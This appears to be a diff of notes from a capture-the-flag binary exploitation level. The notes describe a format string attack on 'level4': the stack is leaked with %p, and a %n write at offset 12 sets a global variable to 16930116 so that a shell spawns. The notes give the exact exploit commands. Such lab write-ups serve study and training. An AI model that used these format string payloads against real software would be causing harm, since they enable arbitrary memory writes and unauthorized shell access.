@@ -1,18 +1,18 @@
 - attack: format string exploitation
-- binary behavior: fgets argument and send it to printf, if global argument = 64 run the shell
+- binary behavior: fgets argument and send it to printf, if global argument = 16930116 run the shell
 - targeted functions: n, p and main
 - vulnerability in v: printf() without argument (Bugs section in printf man)
 - defense: fget
 
 Method:
 - do stack leakage
-- find in leakage the position of the buffer (find repetition and compare with hex ASCII table)
+- find in leakage the position of the argument (find repetition and compare with hex ASCII table)
 - find the global variable (password)
 - overwrite buffer with address of global variable 
 - and pass 16930116 as its value
  
 Info:
-- positon of buffer in stack - 12
+- positon of argument in stack - 12
 
 - 0x8049810 - address global variable
 - 10980408 - same in little-endian
@@ -25,7 +25,7 @@ Info:
 Code:
 objdump -d ./level4
 (python -c 'print "0000" + " %p" * 15'; cat) | ./level4
-./level4 <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"')
+./level4 <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112u" + "%12$n"')
 
 
 Functions
